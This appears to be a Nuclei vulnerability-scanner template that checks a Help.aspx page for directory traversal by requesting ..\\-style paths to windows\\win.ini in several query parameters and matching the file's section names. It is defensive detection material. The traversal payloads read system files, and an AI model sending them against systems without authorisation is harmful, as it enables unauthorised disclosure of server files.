id: windows-winini-file-disclosure
info:
  name: Windows win.ini File Disclosure via Directory Traversal
  author: Nikhil Patidar
  severity: medium
  description: |
    This template detects directory traversal vulnerability leading to disclosure of the Windows win.ini file
    via Help.aspx with the 'item' parameter. Successful exploitation reveals typical win.ini contents.
  tags: directory-traversal, file-disclosure, windows, aspnet
requests:
  - method: GET
    path:
      - "{{BaseURL}}/Help.aspx?item=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"
      - "{{BaseURL}}/Help.aspx?file=..\\..\\..\\..\\..\\windows\\win.ini"
      - "{{BaseURL}}/Help.aspx?config=..\\..\\windows\\win.ini"
      - "{{BaseURL}}/Help.aspx?item=windows\\win.ini"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "[fonts]"
          - "[mci]"
          - "[drivers]"
          - "extensions"
          - "windows"
    extractors:
      - type: regex
        name: extracted_font_section
        regex:
          - "\\[fonts\\]"
      - type: regex
        name: extracted_mci_section
        regex:
          - "\\[mci\\]"
